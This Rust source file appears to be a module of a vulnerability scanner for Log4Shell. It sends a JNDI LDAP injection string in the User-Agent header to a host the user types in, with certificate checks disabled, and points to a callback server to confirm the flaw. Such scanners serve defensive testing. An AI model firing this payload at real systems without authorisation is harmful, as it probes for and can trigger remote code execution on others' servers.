use anyhow::{Result, Context};
use rand::Rng;
use reqwest::Client;
use std::io::{self, Write};

pub async fn run(target: &str) -> Result<()> {
    run_interactive(target).await
}

pub async fn run_interactive(_target: &str) -> Result<()> {
    print!("Enter URL or host to scan: ");
    io::stdout().flush().ok();
    let mut input = String::new();
    io::stdin().read_line(&mut input)?;
    let host = input.trim();

    let client = Client::builder()
        .redirect(reqwest::redirect::Policy::limited(3))
        .danger_accept_invalid_certs(true)
        .build()
        .context("Failed to build HTTP client")?;

    let token: u32 = rand::thread_rng().gen();
    let payload = format!("${{jndi:ldap://{:x}.example.com/a}}", token);

    for scheme in ["http", "https"] {
        let url = if host.starts_with("http") {
            host.to_string()
        } else {
            format!("{}://{}", scheme, host)
        };
        match client.get(&url).header("User-Agent", &payload).send().await {
            Ok(resp) => {
                println!("[+] {} -> status {}", url, resp.status());
            }
            Err(e) => {
                println!("[-] Failed {}: {}", url, e);
            }
        }
    }

    println!("[*] Payload sent. Check your callback server for any connections to confirm vulnerability.");
    Ok(())
}
